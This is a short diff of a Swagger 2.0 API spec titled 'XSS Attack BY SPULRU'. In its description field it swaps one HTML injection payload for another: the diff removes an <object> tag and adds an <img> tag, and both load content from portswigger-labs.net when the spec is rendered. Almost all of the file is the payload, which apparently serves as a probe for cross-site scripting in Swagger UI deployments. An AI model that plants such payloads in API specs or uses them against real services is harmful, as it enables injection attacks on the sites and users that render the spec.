@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
-  description: <object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>
+  description: <img referrerpolicy="no-referrer" src="//portswigger-labs.net">
     
   version: production
 basePath: /JSSResource/
